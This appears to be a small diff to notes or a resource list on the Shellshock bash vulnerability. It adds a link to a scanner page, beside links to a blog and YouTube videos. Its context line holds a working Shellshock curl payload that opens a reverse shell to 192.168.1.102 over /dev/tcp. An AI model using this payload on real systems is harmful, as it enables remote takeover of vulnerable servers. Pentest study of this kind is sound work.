@@ -53,7 +53,7 @@ curl –H 'x: () { :;}; /bin/bash –I >& /dev/tcp/192.168.1.102 0>&1'
 
 
 
-
+https://pentest-tools.com/network-vulnerability-scanning/bash-shellshock-scanner
 http://dev4sec.blogspot.com/search?q=shellshock
 https://www.youtube.com/watch?v=U0HtR92phQY
 https://www.youtube.com/channel/UCYXR6jyFsPyK0IW9d13U8bQ
